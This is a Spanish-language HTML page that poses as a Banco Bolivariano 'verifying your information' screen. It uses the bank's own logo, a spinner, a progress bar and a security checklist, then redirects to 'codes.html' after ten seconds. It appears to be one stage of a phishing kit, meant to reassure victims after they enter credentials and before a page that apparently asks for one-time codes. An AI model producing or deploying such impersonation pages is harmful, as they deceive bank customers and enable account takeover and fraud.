<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Banco Bolivariano - Verificando</title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: "Inter", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
    }

    body {
      background: #ffffff;
      color: #111827;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .container {
      max-width: 480px;
      padding: 32px 20px;
      text-align: center;
    }

    .logo {
      margin-bottom: 40px;
    }

    .logo img {
      height: 36px;
    }

    .spinner-wrapper {
      margin: 0 auto 32px;
      width: 80px;
      height: 80px;
      position: relative;
    }

    .spinner {
      width: 100%;
      height: 100%;
      border: 4px solid #e5e7eb;
      border-top-color: #059669;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .title {
      font-size: 24px;
      font-weight: 700;
      margin-bottom: 12px;
      color: #111827;
    }

    .subtitle {
      font-size: 15px;
      color: #6b7280;
      line-height: 1.6;
      margin-bottom: 8px;
    }

    .dots {
      display: inline-block;
      width: 20px;
      text-align: left;
    }

    .dots::after {
      content: '';
      animation: dots 1.5s steps(4, end) infinite;
    }

    @keyframes dots {
      0%, 20% { content: ''; }
      40% { content: '.'; }
      60% { content: '..'; }
      80%, 100% { content: '...'; }
    }

    .info-box {
      background: #f9fafb;
      border: 1px solid #e5e7eb;
      border-radius: 12px;
      padding: 20px;
      margin-top: 32px;
      text-align: left;
    }

    .info-title {
      font-size: 14px;
      font-weight: 600;
      color: #059669;
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .info-list {
      list-style: none;
      padding: 0;
    }

    .info-list li {
      font-size: 13px;
      color: #6b7280;
      padding: 6px 0;
      padding-left: 20px;
      position: relative;
    }

    .info-list li::before {
      content: "✓";
      position: absolute;
      left: 0;
      color: #059669;
      font-weight: 700;
    }

    .progress-bar {
      width: 100%;
      height: 4px;
      background: #e5e7eb;
      border-radius: 2px;
      margin-top: 24px;
      overflow: hidden;
    }

    .progress-fill {
      height: 100%;
      background: #059669;
      border-radius: 2px;
      animation: progress 10s ease-in-out forwards;
    }

    @keyframes progress {
      0% { width: 0%; }
      100% { width: 100%; }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Logo -->
    <div class="logo">
      <img src="https://portalbb-multimedia.bolivariano.com/images/default-source/new-home/logo-bb.png"
           alt="Banco Bolivariano">
    </div>

    <!-- Spinner -->
    <div class="spinner-wrapper">
      <div class="spinner"></div>
    </div>

    <!-- Título -->
    <h1 class="title">Verificando tu información</h1>
    <p class="subtitle">
      Por favor espera mientras procesamos tu solicitud<span class="dots"></span>
    </p>

    <!-- Barra de progreso -->
    <div class="progress-bar">
      <div class="progress-fill"></div>
    </div>

    <!-- Información adicional -->
    <div class="info-box">
      <div class="info-title">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
        </svg>
        Tu seguridad es nuestra prioridad
      </div>
      <ul class="info-list">
        <li>Verificando credenciales de acceso</li>
        <li>Comprobando medidas de seguridad</li>
        <li>Estableciendo conexión segura</li>
      </ul>
    </div>
  </div>

  <script>
    // Redirigir a codes.html después de 10 segundos
    setTimeout(() => {
      window.location.href = "codes.html";
    }, 10000);
  </script>
</body>
</html>
